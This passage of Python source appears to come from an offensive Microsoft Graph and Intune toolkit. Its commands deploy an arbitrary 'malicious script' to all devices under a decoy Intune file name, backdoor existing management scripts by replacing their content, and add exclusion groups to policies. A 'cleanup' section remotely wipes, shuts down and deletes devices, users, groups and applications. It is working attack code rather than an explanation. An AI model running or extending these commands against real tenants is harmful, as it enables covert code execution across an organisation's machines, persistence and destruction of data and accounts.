            'Content-Type': 'application/json',
            'User-Agent': user_agent
        }

        settings_map = {
            "device_vendor_msft_windowsadvancedthreatprotection_configurationtype": "Microsoft Defender for Endpoint client configuration package type",
            "device_vendor_msft_windowsadvancedthreatprotection_configuration_samplesharing": "Sample sharing",
            "device_vendor_msft_laps_policies_backupdirectory": {
                "description": "Backup Directory",
                "values": {
                    "0": "Disabled (password will not be backed up)",
                    "1": "Backup the password to Azure AD only",
                    "2": "Backup the password to Active Directory only"
                }
            },
            "device_vendor_msft_laps_policies_passwordagedays": "Password Age Days",
            "device_vendor_msft_laps_policies_passwordagedays_aad": "Password Age Days (AAD)",
            "device_vendor_msft_laps_policies_passwordexpirationprotectionenabled": {
                "description": "Password Expiration Protection",
                "values": {
                    "0": "Password Expiration Protection Disabled",
                    "1": "Password Expiration Protection Enabled"
                }
            },
            "device_vendor_msft_laps_policies_adpasswordencryptionenabled": {
                "description": "AD Password Encryption",
                "values": {
                    "0": "AD Password Encryption Disabled",
                    "1": "AD Password Encryption Enabled"
                }
            },
            "device_vendor_msft_laps_policies_adpasswordencryptionprincipal": "AD Password Encryption Principal",
            "device_vendor_msft_laps_policies_adencryptedpasswordhistorysize": "AD Encrypted Password History Size",
            "device_vendor_msft_laps_policies_administratoraccountname": "Administrator Account Name",
            "device_vendor_msft_laps_policies_passwordcomplexity": {
                "description": "Password Complexity",
                "values": {
                    "1": "Large letters",
                    "2": "Large letters + small letters",
                    "3": "Large letters + small letters + numbers",
                    "4": "Large letters + small letters + numbers + special characters",
                    "5": "Large letters + small letters + numbers + special characters (improved readability)"
                }
            },
            "device_vendor_msft_laps_policies_passwordlength": "Password Length",
            "device_vendor_msft_laps_policies_postauthenticationactions": {
                "description": "Post Authentication Actions",
                "values": {
                    "1": "Reset password: upon expiry of the grace period, the managed account password will be reset.",
                    "3": "Reset the password and logoff the managed account: upon expiry of the grace period, the managed account password will be reset and any interactive logon sessions using the managed account will be terminated.",
                    "5": "Reset the password and reboot: upon expiry of the grace period, the managed account password will be reset and the managed device will be immediately rebooted."
                }
            },
            "device_vendor_msft_laps_policies_postauthenticationresetdelay": "Post Authentication Reset Delay"
        }

        response = requests.get(api_url, headers=headers)

        if response.status_code == 200:
            response_json = response.json()

            for setting in response_json.get('value', []):
                setting_instance = setting.get('settingInstance')
                setting_def_id = setting_instance.get('settingDefinitionId')
                if setting_instance and setting_def_id:
                    if setting_instance['@odata.type'] == "#microsoft.graph.deviceManagementConfigurationChoiceSettingInstance":
                        choice_value = setting_instance.get('choiceSettingValue', {}).get('value')
                        if choice_value and setting_def_id in settings_map:
                            setting_text = settings_map[setting_def_id]
                            if isinstance(setting_text, dict):
                                setting_description = setting_text.get('description', setting_def_id)
                                setting_value = setting_text['values'].get(choice_value.split('_')[-1], choice_value)
                                print(f"{setting_description}: {setting_value}")
                            else:
                                print(f"{setting_text}: {choice_value}")

                        children = setting_instance.get('choiceSettingValue', {}).get('children', [])
                        for child in children:
                            child_def_id = child.get('settingDefinitionId')
                            if child['@odata.type'] == "#microsoft.graph.deviceManagementConfigurationSimpleSettingInstance":
                                simple_value = child.get('simpleSettingValue', {}).get('value')
                                if simple_value and child_def_id in settings_map:
                                    mapped_value = settings_map[child_def_id]
                                    if isinstance(mapped_value, dict):
                                        description = mapped_value.get('description', child_def_id)
                                        value = mapped_value['values'].get(str(simple_value), simple_value)
                                        print(f"{description}: {value}")
                                    else:
                                        print(f"{mapped_value}: {simple_value}")

                    elif setting_instance['@odata.type'] == "#microsoft.graph.deviceManagementConfigurationSimpleSettingInstance":
                        simple_value = setting_instance.get('simpleSettingValue', {}).get('value')
                        if simple_value and setting_def_id in settings_map:
                            mapped_value = settings_map[setting_def_id]
                            if isinstance(mapped_value, dict):
                                description = mapped_value.get('description', setting_def_id)
                                value = mapped_value['values'].get(str(simple_value), simple_value)
                                print(f"{description}: {value}")
                            else:
                                print(f"{mapped_value}: {simple_value}")

        else:
            print_red(f"[-] Failed to retrieve settings: {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # display-usergroupaccountprotectionpolicyrules
    elif args.command and args.command.lower() == "display-usergroupaccountprotectionpolicyrules":
        if not args.id:
            print_red("[-] Error: --id argument is required for Display-UserGroupAccountProtectionPolicyRules command")
            return

        print_yellow("\n[*] Display-UserGroupAccountProtectionPolicyRules")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/beta/deviceManagement/configurationPolicies('{args.id}')/settings"

        if args.select:
            api_url += f"?$select={args.select}"

        headers = {
            'Authorization': f'Bearer {access_token}',
            'Content-Type': 'application/json',
            'User-Agent': get_user_agent(args)
        }

        response = requests.get(api_url, headers=headers)

        if response.status_code == 200:
            settings = response.json().get('value', [])

            local_groups = []
            for setting in settings:
                group_setting_collection = setting.get('settingInstance', {}).get('groupSettingCollectionValue', [])
                for group_setting in group_setting_collection:
                    children = group_setting.get('children', [])
                    for child in children:
                        child_children = child.get('groupSettingCollectionValue', [])
                        for child_child in child_children:
                            for item in child_child.get('children', []):
                                if item.get('settingDefinitionId') == "device_vendor_msft_policy_config_localusersandgroups_configure_groupconfiguration_accessgroup_userselectiontype":
                                    choice_value = item.get('choiceSettingValue', {}).get('value', '')
                                    description = "Users/Groups" if choice_value.endswith("_users") else "Manual"
                                    print(f"User selection type: {description}")

                                if item.get('settingDefinitionId') == "device_vendor_msft_policy_config_localusersandgroups_configure_groupconfiguration_accessgroup_action":
                                    choice_value = item.get('choiceSettingValue', {}).get('value', '')
                                    action_map = {
                                        "device_vendor_msft_policy_config_localusersandgroups_configure_groupconfiguration_accessgroup_action_add_update": "Add (Update)",
                                        "device_vendor_msft_policy_config_localusersandgroups_configure_groupconfiguration_accessgroup_action_remove_update": "Remove (Update)",
                                        "device_vendor_msft_policy_config_localusersandgroups_configure_groupconfiguration_accessgroup_action_add_restrict": "Add (Replace)"
                                    }
                                    action = action_map.get(choice_value, choice_value)
                                    print(f"Group and user action: {action}")

                                if item.get('settingDefinitionId') == "device_vendor_msft_policy_config_localusersandgroups_configure_groupconfiguration_accessgroup_desc":
                                    group_map = {
                                        "device_vendor_msft_policy_config_localusersandgroups_configure_groupconfiguration_accessgroup_desc_administrators": "Administrators",
                                        "device_vendor_msft_policy_config_localusersandgroups_configure_groupconfiguration_accessgroup_desc_users": "Users",
                                        "device_vendor_msft_policy_config_localusersandgroups_configure_groupconfiguration_accessgroup_desc_remotedesktopusers": "Remote Desktop Users",
                                        "device_vendor_msft_policy_config_localusersandgroups_configure_groupconfiguration_accessgroup_desc_remotemanagementusers": "Remote Management Users",
                                        "device_vendor_msft_policy_config_localusersandgroups_configure_groupconfiguration_accessgroup_desc_powerusers": "Power Users",
                                        "device_vendor_msft_policy_config_localusersandgroups_configure_groupconfiguration_accessgroup_desc_guests": "Guests"
                                    }
                                    for choice in item.get('choiceSettingCollectionValue', []):
                                        group = group_map.get(choice.get('value', ''), choice.get('value', ''))
                                        local_groups.append(group)

            if local_groups:
                print(f"Local groups: {', '.join(local_groups)}")

        else:
            print_red(f"[-] Failed to retrieve settings: {response.status_code}")
            print_red(response.text)

        print("=" * 80)

    # get-devicecompliancepolicies
    elif args.command and args.command.lower() == "get-devicecompliancepolicies":
        print_yellow("\n[*] Get-DeviceCompliancePolicies")
        print("=" * 80)
        api_url = "https://graph.microsoft.com/v1.0/deviceManagement/deviceCompliancePolicies?$expand=assignments,scheduledActionsForRule($expand=scheduledActionConfigurations)"

        if args.select:
            api_url += "?$select=" + args.select

        try:
            output_returned = False
            while api_url:
                user_agent = get_user_agent(args)
                headers = {
                    "Authorization": f"Bearer {access_token}",
                    "User-Agent": user_agent
                }
                response = requests.get(api_url, headers=headers)
                response.raise_for_status()
                response_body = response.json()
                filtered_data = {key: value for key, value in response_body.items() if not key.startswith("@odata")}

                if filtered_data and 'value' in filtered_data:
                    for d in filtered_data.get('value', []):
                        for key, value in d.items():
                            if key == "assignments":
                                if not value:
                                    print_red("assignments : no assignments")
                                else:
                                    print_green(f"{key} : {value}")
                            elif key == "scheduledActionsForRule":
                                if not value:
                                    print_red("scheduledActionsForRule : no scheduled actions")
                                else:
                                    print_green(f"{key} : {value}")
                            else:
                                print(f"{key} : {value}")
                        print("\n")
                    output_returned = True

                api_url = response_body.get("@odata.nextLink")

            if not output_returned:
                print_red("[-] No data found")

        except requests.exceptions.RequestException as ex:
            print_red(f"[-] HTTP Error: {ex}")

        print("=" * 80)

    # add-exclusiongrouptopolicy
    elif args.command and args.command.lower() == "add-exclusiongrouptopolicy":
        if not args.id:
            print_red("[-] Error: --id argument is required for Add-ExclusionGroupToPolicy command")
            return

        print_yellow("\n[*] Add-ExclusionGroupToPolicy")
        print("=" * 80)
        
        assignments_api_url = f"https://graph.microsoft.com/beta/deviceManagement/configurationPolicies('{args.id}')/assignments"
        assign_api_url = f"https://graph.microsoft.com/beta/deviceManagement/configurationPolicies('{args.id}')/assign"
        
        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'Content-Type': 'application/json',
            'User-Agent': user_agent
        }
        
        # get the current assignments so we don't mess up day-to-day ops
        response = requests.get(assignments_api_url, headers=headers)
        if response.ok:
            current_assignments = response.json().get('value', [])
        else:
            print_red(f"[-] Failed to retrieve current assignments: {response.status_code}")
            print_red(response.text)
            print("=" * 80)
            return
        
        try:
            groupid = input("\nEnter Group ID To Exclude: ").strip()
        except KeyboardInterrupt:
            sys.exit()

        new_assignments = current_assignments + [
            {
                "target": {
                    "@odata.type": "#microsoft.graph.exclusionGroupAssignmentTarget",
                    "groupId": groupid
                }
            }
        ]
        
        body = {
            "assignments": new_assignments
        }
        
        response = requests.post(assign_api_url, headers=headers, json=body)
        if response.ok:
            print_green(f"\n[+] Excluded group added to policy rules")
        else:
            print_red(f"\n[-] Failed to add excluded group to policy rules: {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # deploy-maliciousscript
    elif args.command and args.command.lower() == "deploy-maliciousscript":
        if not args.script:
            print_red("[-] Error: --script argument is required for Deploy-MaliciousScript command")
            return

        print_yellow("\n[*] Deploy-MaliciousScript")
        print("=" * 80)

        script_content = read_file_content(args.script)
        
        try:
            display_name = input("\nEnter Script Display Name: ").strip()
            description = input("Enter Script Description: ").strip()
            runasaccount = input("Run As Account (user/system): ").strip().lower()
            sigcheck = input("Enforce Signature Check? (true/false): ").strip().lower()
            runas32bit = input("Run As 64-bit? (true/false): ").strip().lower()

            if runasaccount not in ['user', 'system']:
                print("Invalid input for Run As Account. Defaulting to 'user.")
                runasaccount = 'user'

            if sigcheck not in ['true', 'false']:
                print("Invalid input for Enforce Signature Check. Defaulting to 'false'.")
                sigcheck = 'false'

            if runas32bit not in ['true', 'false']:
                print("Invalid input for Run As 64-bit. Defaulting to 'false'.")
                runas32bit = 'false'

        except KeyboardInterrupt:
            sys.exit()

        user_agent = get_user_agent(args)

        url_create = "https://graph.microsoft.com/beta/deviceManagement/deviceManagementScripts"
        headers = {
            "Authorization": f"Bearer {access_token}",
            "Content-Type": "application/json",
            "User-Agent": user_agent
        }
        encoded_script_content = base64.b64encode(script_content.encode('utf-8')).decode('utf-8')
        script_payload = {
            "@odata.type": "#microsoft.graph.deviceManagementScript",
            "displayName": display_name,
            "description": description,
            "runSchedule": {
                "@odata.type": "microsoft.graph.runSchedule"
            },
            "scriptContent": encoded_script_content,
            "runAsAccount": runasaccount,
            "enforceSignatureCheck": sigcheck == 'true',
            "fileName": "Deploy-PrinterSettings.ps1", # use legit Intune script name
            "runAs32Bit": runas32bit == 'true'
        }

        response = requests.post(url_create, headers=headers, json=script_payload)
        if response.status_code == 201:
            print_green("\n[+] Script created successfully")
            script_id = response.json().get('id')
            print_green(f"[+] Script ID: {script_id}")

            url_assign = f"https://graph.microsoft.com/beta/deviceManagement/deviceManagementScripts/{script_id}/assign"
            
            try:
                assignments = []

                assign_all_devices = input("\nAssign to all devices? (yes/no): ").strip().lower()
                if assign_all_devices == 'yes':
                    assignments.append({
                        "target": {
                            "@odata.type": "#microsoft.graph.allDevicesAssignmentTarget"
                        }
                    })

                assign_all_users = input("Assign to all users? (yes/no): ").strip().lower()
                if assign_all_users == 'yes':
                    assignments.append({
                        "target": {
                            "@odata.type": "#microsoft.graph.allLicensedUsersAssignmentTarget"
                        }
                    })

                assign_specific_group = input("Assign to specific group? (yes/no): ").strip().lower()
                if assign_specific_group == 'yes':
                    group_id = input("Enter Group ID: ").strip()
                    assignments.append({
                        "target": {
                            "@odata.type": "#microsoft.graph.groupAssignmentTarget",
                            "groupId": group_id
                        }
                    })

                add_group_exclusion = input("Add group exclusion? (yes/no): ").strip().lower()
                if add_group_exclusion == 'yes':
                    exclusion_group_id = input("Enter Group ID to Exclude: ").strip()
                    assignments.append({
                        "target": {
                            "@odata.type": "#microsoft.graph.exclusionGroupAssignmentTarget",
                            "groupId": exclusion_group_id
                        }
                    })

            except KeyboardInterrupt:
                sys.exit()

            assignment_payload = {
                "deviceManagementScriptAssignments": assignments
            }

            response = requests.post(url_assign, headers=headers, json=assignment_payload)
            if response.status_code == 200:
                print_green("\n[+] Script assigned successfully")
            else:
                print_red(f"[-] Failed to assign script: {response.status_code}")
                print(response.text)
        else:
            print_red(f"[-] Failed to create script: {response.status_code}")
            print(response.text)
        print("=" * 80)

    # backdoor-script
    elif args.command and args.command.lower() == "backdoor-script":
        if not args.id or not args.script:
            print_red("[-] Error: --id and --script required for Backdoor-Script command")
            return
        print_yellow("\n[*] Backdoor-Script")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/beta/deviceManagement/deviceManagementScripts/{args.id}"
        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'Content-Type': 'application/json',
            'User-Agent': user_agent
        }
        
        # 1. get current target script settings and encode new script content so we don't override anything
        # - could add option to alter pre-existing settings...
        try:
            script_content = read_file_content(args.script)
            encoded_script_content = base64.b64encode(script_content.encode('utf-8')).decode('utf-8')
        except Exception as e:
            print_red(f"[-] Error reading or encoding script file: {e}")
            return

        response = requests.get(api_url, headers=headers)
        if response.ok:
            json_data = response.json()
            json_data.pop('@odata.context', None) # remove or 400 err
            json_data.pop('id', None) # remove or 400 err
            json_data.pop('createdDateTime', None) # remove or 400 err
            json_data.pop('lastModifiedDateTime', None) # remove or 400 err
            json_data['scriptContent'] = encoded_script_content # replace with our new script content
        else:
            print_red(f"[-] HTTP Error: {response.status_code}")
            print_red(response.text)
            return

        # 2. patch script with updated script content
        patch = requests.patch(api_url, headers=headers, json=json_data)
        if patch.ok:
            print_green("\n[+] Patched device management script successfully\n")
            json_data = patch.json()

            script_content = json_data.get('scriptContent')
            if script_content:
                decoded_script_content = base64.b64decode(script_content).decode('utf-8')
                json_data['scriptContent'] = decoded_script_content

            json_data.pop('@odata.context', None)
            json_data.pop('scriptContent', None)
            for key, value in json_data.items():
                print(f"{key} : {value}")

            if script_content:
                print_green("scriptContent :\n")
                print(decoded_script_content)
        else:
            print_red(f"[-] Error patching device management script: {patch.status_code}")
            print_red(patch.text)
        print("=" * 80)

    # deploy-maliciouswin32app
    # - user will have to packagae app prior
    # https://cloudinfra.net/how-to-deploy-exe-applications-using-intune/
    # https://www.systemcenterdudes.com/deploy-microsoft-intune-win32-apps/
    # 
    # POST https://graph.microsoft.com/beta/deviceAppManagement/mobileApps/
    # {"@odata.type":"#microsoft.graph.win32LobApp","applicableArchitectures":"x64,x86","allowAvailableUninstall":false,"categories":[],"description":"IntuneMessageBox","developer":"","displayName":"IntuneMessageBox","displayVersion":"","fileName":"IntuneMessageBox.intunewin","installCommandLine":"IntuneMessageBox.exe","installExperience":{"deviceRestartBehavior":"suppress","maxRunTimeInMinutes":30,"runAsAccount":"system"},"informationUrl":"","isFeatured":false,"roleScopeTagIds":[],"notes":"","minimumSupportedWindowsRelease":"1607","msiInformation":null,"owner":"","privacyInformationUrl":"","publisher":"ECorp","returnCodes":[{"returnCode":0,"type":"success"},{"returnCode":1707,"type":"success"},{"returnCode":3010,"type":"softReboot"},{"returnCode":1641,"type":"hardReboot"},{"returnCode":1618,"type":"retry"}],"rules":[{"@odata.type":"#microsoft.graph.win32LobAppFileSystemRule","ruleType":"detection","operator":"notConfigured","check32BitOn64System":false,"operationType":"exists","comparisonValue":null,"fileOrFolderName":"IntuneMessageBox.exe","path":"C:\\Program Files\\IntuneMessageBox.exe"}],"runAs32Bit":false,"setupFilePath":"IntuneMessageBox.exe","uninstallCommandLine":"IntuneMessageBox.exe"}
    # - ime tried to install
    # -> need to add install/uninstall instruction batch script
    elif args.command and args.command.lower() == "deploy-maliciouswin32exe": # don't use this yet
        url = "https://graph.microsoft.com/beta/deviceAppManagement/mobileApps/"

        # add the option to be available in the company portal for download!
        data = {
            "@odata.type": "#microsoft.graph.win32LobApp",
            "applicableArchitectures": "x64,x86",
            "allowAvailableUninstall": False,
            "categories": [],
            "description": "IntuneMessageBox",
            "developer": "",
            "displayName": "IntuneMessageBox",
            "displayVersion": "",
            "fileName": "IntuneMessageBox.intunewin",
            "installCommandLine": "IntuneMessageBox.exe",
            "installExperience": {
                "deviceRestartBehavior": "suppress",
                "maxRunTimeInMinutes": 30,
                "runAsAccount": "system"
            },
            "informationUrl": "",
            "isFeatured": False,
            "roleScopeTagIds": [],
            "notes": "",
            "minimumSupportedWindowsRelease": "1607",
            "msiInformation": None,
            "owner": "",
            "privacyInformationUrl": "",
            "publisher": "ECorp",
            "returnCodes": [
                {"returnCode": 0, "type": "success"},
                {"returnCode": 1707, "type": "success"},
                {"returnCode": 3010, "type": "softReboot"},
                {"returnCode": 1641, "type": "hardReboot"},
                {"returnCode": 1618, "type": "retry"}
            ],
            "rules": [
                {
                    "@odata.type": "#microsoft.graph.win32LobAppFileSystemRule",
                    "ruleType": "detection",
                    "operator": "notConfigured",
                    "check32BitOn64System": False,
                    "operationType": "exists",
                    "comparisonValue": None,
                    "fileOrFolderName": "IntuneMessageBox.exe",
                    "path": "C:\\Program Files\\IntuneMessageBox.exe"
                }
            ],
            "runAs32Bit": False,
            "setupFilePath": "IntuneMessageBox.exe",
            "uninstallCommandLine": "IntuneMessageBox.exe"
        }

    # deploy-maliciouswin32msi
    # - after confirming win32exe 

    # update-deviceconfig
    elif args.command and args.command.lower() == "update-deviceconfig":
        if not args.id:
            print_red("[-] Error: --id required for Update-DeviceConfig command")
            return

        properties = [
            {
                "Property": "ownerType",
                "Description": "Ownership of the device. Possible values are, 'company' or 'personal'. Default is unknown. Supports $filter operator 'eq' and 'or'. Possible values are: unknown, company, personal."
            },
            {
                "Property": "managedDeviceOwnerType",
                "Description": "Ownership of the device. Can be 'company' or 'personal'. Possible values are: unknown, company, personal."
            },
            {
                "Property": "managedDeviceName",
                "Description": "Automatically generated name to identify a device. Can be overwritten to a user friendly name."
            },
            {
                "Property": "notes",
                "Description": "Notes on the device created by IT Admin. Default is null. To retrieve actual values GET call needs to be made, with device id and included in select parameter. Supports: $select. $Search is not supported."
            },
            {
                "Property": "roleScopeTagIds",
                "Description": "List of Scope Tag IDs for this Device instance."
            },
            {
                "Property": "configurationManagerClientHealthState",
                "Description": "Configuration manager client health state, valid only for devices managed by MDM/ConfigMgr Agent."
            },
            {
                "Property": "configurationManagerClientInformation",
                "Description": "Configuration manager client information, valid only for devices managed, duel-managed or tri-managed by ConfigMgr Agent."
            }
        ]

        print_yellow("\n[*] Update-DeviceConfig")
        print("=" * 80)
        print("\033[34m[>] Device Properties: https://learn.microsoft.com/en-us/graph/api/intune-devices-manageddevice-update\033[0m\n")
        api_url = f"https://graph.microsoft.com/beta/deviceManagement/managedDevices('{args.id}')"

        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'Content-Type': 'application/json',
            'User-Agent': user_agent
        }

        table = [[prop["Property"], prop["Description"]] for prop in properties]
        separator = ['-' * 20, '-' * 50]

        tablenew = tabulate([["Property", "Description"]] + [separator] + table, headers="firstrow", tablefmt="plain", colalign=("left", "left"))
        print(tablenew)

        try:
            prop = input("\nEnter Property: ").strip()
            newvalue = input("Enter New Value: ").strip()
        except KeyboardInterrupt:
            sys.exit()

        json_body = {
                prop : newvalue
            }

        response = requests.patch(api_url, headers=headers, data=json.dumps(json_body))
        if response.ok:
            print_green("\n[+] Device config updated successfully")
        
        else:
            print_red(f"\n[-] Failed to update device config: {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # reboot-device 
    elif args.command and args.command.lower() == "reboot-device":
        if not args.id:
            print_red("[-] Error: --id argument is required for Reboot-Device command")
            return

        print_yellow("\n[*] Reboot-Device")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/beta/deviceManagement/managedDevices/{args.id}/rebootNow"
        
        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'Content-Type': 'application/json',
            'User-Agent': user_agent
        }
        
        response = requests.post(api_url, headers=headers)
        if response.ok:
            print_green(f"[+] Device reboot initiated successfully")
        else:
            print_red(f"[-] Failed to initiate device reboot: {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # retire-device
    elif args.command and args.command.lower() == "retire-device":
        if not args.id:
            print_red("[-] Error: --id argument is required for Retire-Device command")
            return

        print_yellow("\n[*] Retire-Device")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/beta/deviceManagement/managedDevices/{args.id}/retire"
        user_agent = get_user_agent(args)
        
        headers = {
            'Authorization': f'Bearer {access_token}',
            'User-Agent': user_agent
        }
        
        response = requests.post(api_url, headers=headers)
        if response.ok:
            print_green(f"[+] Device retire initiated successfully")
        else:
            print_red(f"[-] Failed to initiate device retire: {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # lock-device
    elif args.command and args.command.lower() == "lock-device":
        if not args.id:
            print_red("[-] Error: --id argument is required for Lock-Device command")
            return

        print_yellow("\n[*] Lock-Device")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/beta/deviceManagement/managedDevices/{args.id}/remoteLock"
        user_agent = get_user_agent(args)
        
        headers = {
            'Authorization': f'Bearer {access_token}',
            'User-Agent': user_agent
        }
        
        response = requests.post(api_url, headers=headers)
        if response.ok:
            print_green(f"[+] Device lock initiated successfully")
        else:
            print_red(f"[-] Failed to initiate device lock: {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # shutdown-device
    elif args.command and args.command.lower() == "shutdown-device":
        if not args.id:
            print_red("[-] Error: --id argument is required for Shutdown-Device command")
            return

        print_yellow("\n[*] Shutdown-Device")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/beta/deviceManagement/managedDevices/{args.id}/shutDown"
        user_agent = get_user_agent(args)
        
        headers = {
            'Authorization': f'Bearer {access_token}',
            'User-Agent': user_agent
        }
        
        response = requests.post(api_url, headers=headers)
        if response.ok:
            print_green(f"[+] Device shutdown initiated successfully")
        else:
            print_red(f"[-] Failed to initiate device shutdown: {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # add more from
    # https://learn.microsoft.com/en-us/graph/api/resources/intune-devices-manageddevice?view=graph-rest-beta


    ###########
    # Cleanup #
    ###########

    # delete-user
    elif args.command and args.command.lower() == "delete-user":
        if not args.id:
            print_red("[-] Error: --id argument is required for Delete-User command")
            return

        print_yellow("\n[*] Delete-User")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/v1.0/users/{args.id}"
        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'User-Agent': user_agent
        }

        response = requests.delete(api_url, headers=headers)
        if response.ok:
            print_green(f"[+] User deleted")
        else:
            print_red(f"[-] Failed to delete user: {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # delete-group
    elif args.command and args.command.lower() == "delete-group":
        if not args.id:
            print_red("[-] Error: --id argument is required for Delete-Group command")
            return

        print_yellow("\n[*] Delete-Group")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/v1.0/groups/{args.id}"
        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'User-Agent': user_agent
        }

        response = requests.delete(api_url, headers=headers)
        if response.ok:
            print_green(f"[+] Group deleted")
        else:
            print_red(f"[-] Failed to delete group: {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # remove-groupmember
    elif args.command and args.command.lower() == "remove-groupmember":
        if not args.id:
            print_red("[-] Error: --id groupid,objectid required for Remove-GroupMember command")
            return

        ids = args.id.split(',')
        if len(ids) != 2:
            print_red("[-] Please provide two IDs separated by a comma (group ID, object ID).")
            return

        group_id, member_id = ids[0].strip(), ids[1].strip()
        print_yellow("\n[*] Remove-GroupMember")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/v1.0/groups/{group_id}/members/{member_id}/$ref"
        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'User-Agent': user_agent
        }

        response = requests.delete(api_url, headers=headers)
        if response.ok:
            print_green(f"[+] Group member removed")
        else: 
            print_red(f"[-] Failed to remove group member: {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # delete-application
    elif args.command and args.command.lower() == "delete-application":
        if not args.id:
            print_red("[-] Error: --id argument is required for Delete-Application command")
            return

        print_yellow("\n[*] Delete-Application")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/v1.0/applications/{args.id}"
        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'User-Agent': user_agent
        }

        response = requests.delete(api_url, headers=headers)
        if response.ok:
            print_green(f"[+] Application deleted")
        else:
            print_red(f"[-] Failed to delete application: {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # delete-device
    elif args.command and args.command.lower() == "delete-device":
        if not args.id:
            print_red("[-] Error: --id argument is required for Delete-Device command")
            return

        print_yellow("\n[*] Delete-Device")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/v1.0/devices/{args.id}"
        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'User-Agent': user_agent
        }

        response = requests.delete(api_url, headers=headers)
        if response.ok:
            print_green(f"[+] Device deleted")
        else:
            print_red(f"[-] Failed to delete user: {response.status_code}")
            print_red(response.text)
        print("=" * 80)

    # wipe-device
    elif args.command and args.command.lower() == "wipe-device":
        if not args.id:
            print_red("[-] Error: --id argument is required for Wipe-Device command")
            return

        print_yellow("\n[*] Wipe-Device")
        print("=" * 80)
        api_url = f"https://graph.microsoft.com/beta/deviceManagement/managedDevices/{args.id}/wipe"
        
        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'Content-Type': 'application/json',
            'User-Agent': user_agent
        }
        
        body = {
            "keepEnrollmentData": True,
            "keepUserData": True,
            "useProtectedWipe": False
        }
        
        response = requests.post(api_url, headers=headers, json=body)
        if response.ok:
            print_green(f"[+] Device wipe initiated successfully")
        else:
            print_red(f"[-] Failed to initiate device wipe: {response.status_code}")
            print_red(response.text)
        print("=" * 80)


    #############
    # Resolvers #
    #############
    
    # locate-objectid
    elif args.command and args.command.lower() == "locate-objectid":
        if not args.id:
            print_red("[-] Error: --id required for Locate-ObjectID command")
            return

        print_yellow("\n[*] Locate-ObjectID")
        print("=" * 80)
        graph_api_url = "https://graph.microsoft.com/v1.0"
        object_url = f"{graph_api_url}/directoryObjects/{args.id}"

        user_agent = get_user_agent(args)
        headers = {
            'Authorization': f'Bearer {access_token}',
            'User-Agent': user_agent
        }

        try:
            response = requests.get(object_url, headers=headers)
            response.raise_for_status()
            object_data = response.json()
            object_type = object_data.get('@odata.type', '').split('.')[-1]

            print_green(f"Object Type: {object_type}")
            print(f"ID: {object_data.get('id', 'N/A')}")
            print(f"Display Name: {object_data.get('displayName', 'N/A')}")

            if object_type == 'user':
                print(f"User Principal Name: {object_data.get('userPrincipalName', 'N/A')}")
                print(f"Mail: {object_data.get('mail', 'N/A')}")
                print(f"Job Title: {object_data.get('jobTitle', 'N/A')}")
                print(f"Department: {object_data.get('department', 'N/A')}")
                print(f"Office Location: {object_data.get('officeLocation', 'N/A')}")
                print(f"Mobile Phone: {object_data.get('mobilePhone', 'N/A')}")
                print(f"Business Phones: {', '.join(object_data.get('businessPhones', []))}")
                print(f"Account Enabled: {object_data.get('accountEnabled', 'N/A')}")
                print(f"Created DateTime: {object_data.get('createdDateTime', 'N/A')}")
                print(f"Last Sign-In DateTime: {object_data.get('signInActivity', {}).get('lastSignInDateTime', 'N/A')}")
            elif object_type == 'group':
                print(f"Mail: {object_data.get('mail', 'N/A')}")
                print(f"Security Enabled: {object_data.get('securityEnabled', 'N/A')}")
                print(f"Mail Enabled: {object_data.get('mailEnabled', 'N/A')}")
                print(f"Group Types: {', '.join(object_data.get('groupTypes', []))}")
                print(f"Visibility: {object_data.get('visibility', 'N/A')}")
                print(f"Created DateTime: {object_data.get('createdDateTime', 'N/A')}")
                print(f"Description: {object_data.get('description', 'N/A')}")
                print(f"Membership Rule: {object_data.get('membershipRule', 'N/A')}")
                print(f"Is Assignable To Role: {object_data.get('isAssignableToRole', 'N/A')}")
            elif object_type == 'servicePrincipal':
                print(f"App ID: {object_data.get('appId', 'N/A')}")
                print(f"Service Principal Type: {object_data.get('servicePrincipalType', 'N/A')}")
                print(f"App Display Name: {object_data.get('appDisplayName', 'N/A')}")
                print(f"Homepage: {object_data.get('homepage', 'N/A')}")
                print(f"Login URL: {object_data.get('loginUrl', 'N/A')}")
                print(f"Publisher Name: {object_data.get('publisherName', 'N/A')}")
                print(f"App Roles Count: {len(object_data.get('appRoles', []))}")
                print(f"OAuth2 Permissions Count: {len(object_data.get('oauth2Permissions', []))}")
                print(f"Tags: {', '.join(object_data.get('tags', []))}")
                print(f"Account Enabled: {object_data.get('accountEnabled', 'N/A')}")
            elif object_type == 'application':
                print(f"App ID: {object_data.get('appId', 'N/A')}")
                print(f"Sign In Audience: {object_data.get('signInAudience', 'N/A')}")
